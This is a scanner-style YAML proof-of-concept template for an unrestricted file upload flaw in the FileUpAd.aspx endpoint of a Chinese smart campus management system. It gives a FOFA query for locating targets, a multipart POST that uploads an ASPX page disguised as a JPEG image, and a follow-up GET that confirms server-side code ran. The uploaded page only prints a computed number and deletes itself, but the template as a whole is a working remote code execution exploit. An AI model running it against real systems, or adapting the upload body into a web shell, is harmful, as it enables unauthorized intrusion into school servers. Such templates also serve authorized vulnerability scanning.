id: poc-yaml-winstaryc-fileupad-aspx-anyfile-upload
info:
  name: 智慧校园(安校易)管理系统FileUpAd.aspx存在文件上传漏洞
  author: ProjectDiscoveryAI
  severity: critical
  tags: 文件上传
  metadata:
    finger: 智慧校园(安校易)管理系统
    fofa: title="智慧综合管理平台登入"
variables:
  t1: "{{rand_int(100, 1000)}}"
  t2: "{{rand_int(100, 1000)}}"
  t3: "{{to_number(t1) * to_number(t2)}}"
http:
  - id: upload-file
    method: POST
    path:
      - "{{BaseURL}}/Module/FileUpPage/FileUpAd.aspx?file_tmid=upload"
    headers:
      Content-Type: "multipart/form-data; boundary=----21909179191068471382830692394"
    body: |-
      ------21909179191068471382830692394
      Content-Disposition: form-data; name="File"; filename="1.aspx"
      Content-Type: image/jpeg
      
      <%@ Page Language="Jscript" validateRequest="false" %>
      This website has a vulnerability
      <%Response.Write({{t1}} * {{t2}});System.IO.File.Delete(Request.PhysicalPath);%>
      ------21909179191068471382830692394--
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "成功"
          - "文件大小为"
  - id: validate-upload
    method: GET
    path:
      - "{{BaseURL}}/imgnews/imgad/000000/upload.aspx"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "This website has a vulnerability"
          - "{{t3}}"
